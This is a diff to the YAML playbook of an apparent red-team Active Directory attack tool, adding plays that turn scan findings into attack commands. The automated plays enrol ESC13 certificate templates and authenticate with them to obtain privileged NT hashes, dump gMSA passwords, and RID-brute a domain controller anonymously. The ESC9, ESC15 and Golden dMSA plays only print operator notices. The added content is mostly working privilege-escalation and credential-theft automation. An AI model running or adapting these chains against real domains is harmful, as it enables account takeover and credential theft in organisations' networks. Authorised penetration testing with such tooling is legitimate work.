@@ -173,3 +173,139 @@ plays:
       - "echo"
       - "CRITICAL — staged BadSuccessor on {{finding.target}}; manual review required."
     category: badsuccessor
+
+  # ── 7. ADCS ESC9 — surface only ──────────────────────────────────────
+  # ESC9 needs WriteProperty on a target's UPN, which kerb-chain doesn't
+  # know about ahead of time. Print the template + remind the operator
+  # to consult the linked DCSync / ACL findings to find a suitable victim.
+  - name: esc9-warn
+    description: Surface ESC9-vulnerable templates; manual UPN-victim selection.
+    when: "finding.attack == 'AD CS ESC9 (no security extension)'"
+    per: finding
+    command:
+      - "echo"
+      - "ESC9 candidate template: {{finding.target}} — find an account where you have WriteProperty(UPN), then certipy account update + req."
+    category: adcs
+
+  # ── 8. ADCS ESC13 — auto-enrol with operator credential ─────────────
+  - name: esc13-enrol
+    description: For each ESC13 template, enrol with the seed credential —
+                 the issued cert grants the linked privileged group's PAC SID.
+    when: "finding.attack == 'AD CS ESC13 (OIDToGroupLink)' and loot.has_credential"
+    per: finding
+    command:
+      - certipy
+      - req
+      - -ca
+      - "<CA_NAME>"
+      - -template
+      - "{{finding.target}}"
+      - -u
+      - "{{operator_user}}@{{domain}}"
+      - -p
+      - "{{operator_pass}}"
+      - -dc-ip
+      - "{{dc_ip}}"
+      - -out
+      - "{{run_dir}}/esc13-{{finding.target}}"
+    capture:
+      stdout_to_file: certipy-esc13-{{finding.target}}.log
+      files_glob: "esc13-{{finding.target}}*.pfx"
+    on_success:
+      - esc13-auth-with-cert
+    requires_aggressive: true
+    category: adcs
+
+  - name: esc13-auth-with-cert
+    description: Authenticate with the freshly issued ESC13 cert to get the NT
+                 hash (or TGT) of the operator account — but with the linked
+                 privileged group SID baked into the PAC.
+    when: ""
+    command:
+      - certipy
+      - auth
+      - -pfx
+      - "{{run_dir}}/esc13-{{finding.target}}.pfx"
+      - -dc-ip
+      - "{{dc_ip}}"
+    capture:
+      stdout_to_file: certipy-auth-esc13-{{finding.target}}.log
+      cred_hash_regex: '(?P<user>[^\s]+)\s*:\s*aad3b435b51404eeaad3b435b51404ee:(?P<hash>[a-f0-9]{32})'
+    requires_aggressive: true
+    category: adcs
+
+  # ── 9. ADCS ESC15 / EKUwu — surface; the patch matters ──────────────
+  # The April 2024 CU killed the override path on patched CAs. Don't auto-
+  # enrol blindly — emit a notice and let the operator confirm CA build first.
+  - name: esc15-warn
+    description: Surface ESC15 candidate templates; operator must confirm
+                 the CA host predates the April 2024 cumulative update before
+                 attempting the application-policies override.
+    when: "finding.attack in ['AD CS ESC15 / EKUwu (CVE-2024-49019)']"
+    per: finding
+    command:
+      - "echo"
+      - "ESC15 candidate template (v1, public enrol): {{finding.target}}. Confirm CA build < April 2024 CU before -application-policies override."
+    category: adcs
+
+  # ── 10. gMSA password retrieval ──────────────────────────────────────
+  # When the v2 GmsaKdsAudit module flags non-default readers and we
+  # already hold a credential matching that reader, dump the gMSA pwd.
+  - name: gmsadumper
+    description: Retrieve gMSA passwords via gMSADumper for any gMSA whose
+                 non-default reader matches our seed account.
+    when: "finding.attack == 'gMSA password readable by non-default principal' and loot.has_credential"
+    per: finding
+    command:
+      - python3
+      - -m
+      - gMSADumper
+      - -u
+      - "{{operator_user}}"
+      - -p
+      - "{{operator_pass}}"
+      - -d
+      - "{{domain}}"
+    capture:
+      stdout_to_file: gmsa-{{finding.target}}.log
+      cred_hash_regex: '(?P<user>[^\s]+)\s*:::?[a-f0-9]{32}:(?P<hash>[a-f0-9]{32})'
+    requires_aggressive: true
+    category: gmsa
+
+  # ── 11. Pre-Win2k anonymous enumeration ──────────────────────────────
+  # Confirm the open-enumeration finding by actually pulling user list
+  # without credentials. Works even before we have a seed cred — kerb-chain's
+  # default placeholder substitution handles the empty operator gracefully.
+  - name: prewin2k-rid-cycle
+    description: For Anonymous-in-Pre-Win2k findings, prove the open enum
+                 by RID-brute via nxc with empty creds. No seed cred required.
+    when: "finding.attack == 'Pre-Win2k membership: Anonymous Logon'"
+    per: finding
+    command:
+      - nxc
+      - smb
+      - "{{dc_ip}}"
+      - -u
+      - ""
+      - -p
+      - ""
+      - --rid-brute
+    capture:
+      stdout_to_file: prewin2k-rid-brute.log
+    requires_aggressive: true
+    category: hygiene
+
+  # ── 12. Golden dMSA — surface only ───────────────────────────────────
+  # Generating gMSA passwords from KDS root keys is destructive enough
+  # (touches every gMSA, leaves derived-key artefacts) that it MUST stay
+  # operator-controlled. Print a loud line and let the human decide.
+  - name: golden-dmsa-warn
+    description: Loud notice for any KDS root key with non-default readers —
+                 the Golden dMSA chain is staged but kerb-chain refuses to
+                 auto-execute it.
+    when: "finding.attack == 'Golden dMSA prerequisite (KDS root key readable)'"
+    per: finding
+    command:
+      - "echo"
+      - "CRITICAL — Golden dMSA staged on {{finding.target}}; verify reader, then run GoldenDMSA.py manually."
+    category: golden-dmsa
